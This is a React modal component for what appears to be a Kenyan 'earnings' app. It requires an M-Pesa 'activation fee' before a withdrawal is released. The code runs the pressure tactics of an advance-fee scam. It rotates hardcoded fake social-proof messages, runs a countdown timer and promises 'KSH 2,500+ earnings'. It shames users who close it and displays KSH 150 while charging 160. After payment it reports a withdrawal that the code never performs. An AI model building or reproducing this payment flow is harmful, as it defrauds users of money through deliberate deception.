import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { X, ShieldCheck, Smartphone, CheckCircle2, AlertCircle, Zap, Shield, BadgeCheck, Sparkles, Lock, ArrowRight, Timer, Users, TrendingUp, AlertTriangle, Crown } from "lucide-react";
import mpesaIcon from "@/assets/mpesa-icon.png";
import { initiateSTKPush, pollTransactionStatus, isValidPhoneNumber } from "@/lib/hashback-api";
import { supabase } from "@/lib/supabase";
import { useAuth } from "@/contexts/AuthContext";
import { toast } from "sonner";

interface ActivateAccountModalProps {
  isOpen: boolean;
  onClose: () => void;
  onActivated: () => void;
}

const BENEFITS = [];

const URGENCY_MESSAGES = [
  "🔥 47 people activated in the last hour",
  "⚡ Limited spots available today",
  "💸 Activate account for direct M-Pesa withdrawal — No minimum amount",
  "💰 Your KSH 2,500+ earnings are waiting",
];

const ActivateAccountModal = ({ isOpen, onClose, onActivated }: ActivateAccountModalProps) => {
  const { profile, refreshProfile } = useAuth();
  const [phone, setPhone] = useState("");
  const [step, setStep] = useState<"info" | "form" | "processing" | "success" | "error">("info");
  const [errorMessage, setErrorMessage] = useState("");
  const [checkoutId, setCheckoutId] = useState("");
  const [urgencyIndex, setUrgencyIndex] = useState(0);
  const [timeLeft, setTimeLeft] = useState(300); // 5 minutes countdown

  const isValidPhone = isValidPhoneNumber(phone);

  // Rotate urgency messages
  useEffect(() => {
    if (!isOpen) return;
    const interval = setInterval(() => {
      setUrgencyIndex((prev) => (prev + 1) % URGENCY_MESSAGES.length);
    }, 3000);
    return () => clearInterval(interval);
  }, [isOpen]);

  // Countdown timer
  useEffect(() => {
    if (!isOpen || timeLeft <= 0) return;
    const timer = setInterval(() => {
      setTimeLeft((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [isOpen, timeLeft]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleActivate = async () => {
    if (step === "form" && isValidPhone && profile?.id) {
      setStep("processing");
      setErrorMessage("");

      try {
        const reference = `ACT-${Date.now()}-${Math.floor(Math.random() * 1000)}`;
        
        const response = await initiateSTKPush("160", phone, reference);
        
        if (response.CheckoutRequestID) {
          setCheckoutId(response.CheckoutRequestID);
          
          await pollTransactionStatus(response.CheckoutRequestID, 30, 3000);
          
          const { error: updateError } = await supabase
            .from('profiles')
            .update({ is_active: true })
            .eq('id', profile.id);

          if (updateError) throw updateError;

          const { error: txError } = await supabase
            .from('transactions')
            .insert({
              user_id: profile.id,
              type: 'activation',
              amount: 160,
              status: 'completed',
              phone_number: phone,
              reference: reference,
              description: 'Account activation fee',
              completed_at: new Date().toISOString(),
            });

          if (txError) throw txError;

          await refreshProfile();
          
          setStep("success");
          toast.success("Account activated successfully!");
        } else {
          throw new Error(response.ResponseDescription || "Failed to initiate STK Push");
        }
      } catch (error) {
        setErrorMessage(error instanceof Error ? error.message : "Payment failed. Please try again.");
        setStep("error");
      }
    }
  };

  const handleDone = () => {
    setStep("info");
    setPhone("");
    onActivated();
    onClose();
  };

  const handleClose = () => {
    setStep("info");
    setPhone("");
    setErrorMessage("");
    setCheckoutId("");
    onClose();
  };

  return (
    <AnimatePresence>
      {isOpen && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="fixed inset-0 z-[110] flex items-end sm:items-center justify-center"
          onClick={handleClose}
        >
          <div className="absolute inset-0 bg-foreground/60 backdrop-blur-sm" />

          <motion.div
            initial={{ y: "100%", opacity: 0.5 }}
            animate={{ y: 0, opacity: 1 }}
            exit={{ y: "100%", opacity: 0 }}
            transition={{ type: "spring", damping: 28, stiffness: 320 }}
            onClick={(e) => e.stopPropagation()}
            className="relative bg-card w-full max-w-md rounded-t-[2rem] sm:rounded-[2rem] max-h-[92vh] overflow-y-auto"
          >
            <div className="flex justify-center pt-3 pb-1 sm:hidden">
              <div className="w-10 h-1 rounded-full bg-border" />
            </div>

            <div className="p-6">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center gap-3">
                  <motion.div
                    animate={{ rotate: [0, -8, 8, -4, 0] }}
                    transition={{ duration: 0.6, delay: 0.3 }}
                    className="w-11 h-11 rounded-2xl bg-accent/10 flex items-center justify-center"
                  >
                    <Lock size={20} className="text-accent" />
                  </motion.div>
                  <div>
                    <h2 className="text-lg font-extrabold text-card-foreground tracking-tight">Activating Account</h2>
                    <p className="text-xs text-muted-foreground">Activation required</p>
                  </div>
                </div>
                <button onClick={handleClose} className="w-9 h-9 rounded-xl bg-secondary flex items-center justify-center hover:bg-muted transition-colors">
                  <X size={18} className="text-muted-foreground" />
                </button>
              </div>

              {step === "info" && (
                <motion.div
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="space-y-4"
                >
                  {/* Main Value Prop */}
                  <div className="relative overflow-hidden rounded-2xl gradient-primary p-5 text-center">
                    <div className="absolute -top-8 -right-8 w-28 h-28 rounded-full bg-primary-foreground/10" />
                    <div className="absolute -bottom-6 -left-6 w-20 h-20 rounded-full bg-primary-foreground/5" />
                    <div className="relative z-10">
                      <motion.div
                        initial={{ scale: 0 }}
                        animate={{ scale: 1 }}
                        transition={{ type: "spring", delay: 0.2 }}
                        className="w-16 h-16 rounded-full bg-primary-foreground/20 flex items-center justify-center mx-auto mb-3"
                      >
                        <Shield size={32} className="text-primary-foreground" />
                      </motion.div>
                      <h3 className="font-extrabold text-primary-foreground text-lg mb-2">
                        M-Pesa Withdrawal Pending
                      </h3>
                      <p className="text-sm text-primary-foreground/80 leading-relaxed">
                        We have detected your account is inactive. Inactive accounts can't process M-Pesa withdrawal. Activate your account and complete the withdrawal.
                      </p>
                    </div>
                  </div>

                  {/* Scrolling Urgency Message */}
                  <motion.div 
                    key={urgencyIndex}
                    initial={{ opacity: 0, x: 20 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0, x: -20 }}
                    className="flex items-center justify-center gap-2 text-sm font-semibold text-destructive"
                  >
                    {URGENCY_MESSAGES[urgencyIndex]}
                  </motion.div>

                  {/* CTA Button */}
                  <motion.button
                    whileTap={{ scale: 0.97 }}
                    whileHover={{ scale: 1.01 }}
                    onClick={() => setStep("form")}
                    className="w-full h-14 rounded-2xl gradient-primary text-primary-foreground font-bold text-base shadow-primary flex items-center justify-center gap-2"
                  >
                    Activate Account <ArrowRight size={18} />
                  </motion.button>
                  
                  <button onClick={handleClose} className="w-full text-center text-sm text-muted-foreground font-medium py-1">
                    I'll risk losing my earnings →
                  </button>
                </motion.div>
              )}

              {step === "form" && (
                <motion.div
                  initial={{ opacity: 0, x: 20 }}
                  animate={{ opacity: 1, x: 0 }}
                  className="space-y-4"
                >
                  {/* Warning Banner */}
                  <div className="bg-amber-50 border border-amber-200 rounded-xl p-3 flex items-start gap-2">
                    <AlertTriangle size={16} className="text-amber-600 mt-0.5 flex-shrink-0" />
                    <div>
                      <p className="text-xs text-amber-600">
                        Activate your account to enable direct M-Pesa withdrawal and try withdrawal again.
                      </p>
                    </div>
                  </div>

                  <div className="flex items-center gap-3 bg-secondary rounded-2xl p-4">
                    <img src={mpesaIcon} alt="M-Pesa" className="w-10 h-10 object-contain" />
                    <div>
                      <p className="text-sm font-bold text-card-foreground">Pay via M-Pesa</p>
                      <p className="text-xs text-muted-foreground">STK Push · Instant activation</p>
                    </div>
                    <span className="ml-auto font-extrabold text-primary text-lg">KSH 150</span>
                  </div>

                  <div>
                    <label className="text-sm font-semibold text-card-foreground mb-2 block">M-Pesa Number</label>
                    <div className="relative">
                      <Smartphone size={18} className="absolute left-4 top-1/2 -translate-y-1/2 text-muted-foreground" />
                      <input
                        type="tel"
                        value={phone}
                        onChange={(e) => setPhone(e.target.value.replace(/\D/g, ""))}
                        placeholder="0712345678"
                        maxLength={10}
                        className="w-full h-14 rounded-2xl bg-secondary pl-12 pr-4 text-lg font-bold text-card-foreground tracking-wide outline-none focus:ring-2 focus:ring-primary/40 transition-all border border-transparent focus:border-primary"
                      />
                    </div>
                    {phone.length > 0 && !isValidPhone && phone.length >= 4 && (
                      <p className="text-xs text-destructive mt-1.5 ml-1">Enter a valid Safaricom number</p>
                    )}
                  </div>

                  <motion.button
                    whileTap={{ scale: 0.97 }}
                    onClick={handleActivate}
                    disabled={!isValidPhone}
                    className="w-full h-14 rounded-2xl gradient-primary text-primary-foreground font-bold text-base shadow-primary disabled:opacity-30 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                  >
                    <Zap size={18} /> Secure My Earnings Now
                  </motion.button>
                  
                  <p className="text-xs text-center text-muted-foreground">
                    By activating, you agree to our terms. One-time fee only.
                  </p>
                  
                  <button onClick={() => setStep("info")} className="w-full text-center text-sm text-muted-foreground font-medium py-1">
                    ← Go Back
                  </button>
                </motion.div>
              )}

              {step === "processing" && (
                <motion.div
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  className="text-center py-10 space-y-5"
                >
                  <div className="relative w-20 h-20 mx-auto">
                    <motion.div
                      animate={{ rotate: 360 }}
                      transition={{ repeat: Infinity, duration: 1, ease: "linear" }}
                      className="absolute inset-0 border-4 border-primary/15 border-t-primary rounded-full"
                    />
                    <div className="absolute inset-3 bg-secondary rounded-full flex items-center justify-center">
                      <img src={mpesaIcon} alt="M-Pesa" className="w-8 h-8 object-contain" />
                    </div>
                  </div>
                  <div>
                    <h3 className="text-lg font-extrabold text-card-foreground mb-1">Processing Payment</h3>
                    <p className="text-sm text-muted-foreground leading-relaxed">
                      Check your phone for the M-Pesa prompt<br />
                      <span className="font-semibold text-card-foreground">Enter your PIN</span> to complete
                    </p>
                  </div>
                  <motion.div
                    animate={{ opacity: [0.4, 1, 0.4] }}
                    transition={{ repeat: Infinity, duration: 1.5 }}
                    className="flex items-center justify-center gap-1.5"
                  >
                    {[0, 1, 2].map((i) => (
                      <motion.span
                        key={i}
                        animate={{ scale: [1, 1.4, 1] }}
                        transition={{ repeat: Infinity, duration: 1, delay: i * 0.2 }}
                        className="w-2 h-2 rounded-full bg-primary"
                      />
                    ))}
                  </motion.div>
                </motion.div>
              )}

              {step === "success" && (
                <motion.div
                  initial={{ scale: 0.9, opacity: 0 }}
                  animate={{ scale: 1, opacity: 1 }}
                  className="text-center py-6 space-y-5"
                >
                  <motion.div
                    initial={{ scale: 0 }}
                    animate={{ scale: 1 }}
                    transition={{ type: "spring", delay: 0.1, stiffness: 200 }}
                    className="w-20 h-20 rounded-full bg-primary/10 flex items-center justify-center mx-auto"
                  >
                    <motion.div
                      initial={{ scale: 0 }}
                      animate={{ scale: 1 }}
                      transition={{ type: "spring", delay: 0.3 }}
                    >
                      <CheckCircle2 size={48} className="text-primary" />
                    </motion.div>
                  </motion.div>

                  <div>
                    <motion.h3
                      initial={{ opacity: 0, y: 8 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ delay: 0.4 }}
                      className="text-xl font-extrabold text-card-foreground mb-1"
                    >
                      Withdrawal Initiated! 🎉
                    </motion.h3>
                    <motion.p
                      initial={{ opacity: 0 }}
                      animate={{ opacity: 1 }}
                      transition={{ delay: 0.5 }}
                      className="text-sm text-muted-foreground"
                    >
                      Check your M-Pesa account after 24 hours
                    </motion.p>
                  </div>

                  <motion.div
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.6 }}
                    className="bg-green-50 border border-green-200 rounded-xl p-4"
                  >
                    <div className="flex items-center gap-2">
                      <CheckCircle2 size={16} className="text-green-600" />
                      <span className="text-sm text-green-700">Account activated successfully!</span>
                    </div>
                  </motion.div>

                  <motion.button
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    transition={{ delay: 0.7 }}
                    whileTap={{ scale: 0.97 }}
                    onClick={handleDone}
                    className="w-full h-14 rounded-2xl gradient-primary text-primary-foreground font-bold text-base shadow-primary flex items-center justify-center gap-2"
                  >
                    Done <ArrowRight size={18} />
                  </motion.button>
                </motion.div>
              )}

              {step === "error" && (
                <div className="text-center py-6 space-y-4">
                  <div className="w-16 h-16 bg-destructive/10 rounded-full flex items-center justify-center mx-auto">
                    <AlertCircle size={32} className="text-destructive" />
                  </div>
                  <h3 className="text-xl font-bold text-card-foreground">Activation Failed</h3>
                  <p className="text-sm text-destructive px-4">{errorMessage}</p>
                  <div className="flex gap-3 px-4">
                    <button 
                      onClick={() => setStep("form")} 
                      className="flex-1 h-12 rounded-2xl bg-secondary text-secondary-foreground font-semibold"
                    >
                      Try Again
                    </button>
                    <button 
                      onClick={handleClose} 
                      className="flex-1 h-12 rounded-2xl gradient-primary text-primary-foreground font-semibold"
                    >
                      Close
                    </button>
                  </div>
                </div>
              )}
            </div>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );
};

export default ActivateAccountModal;
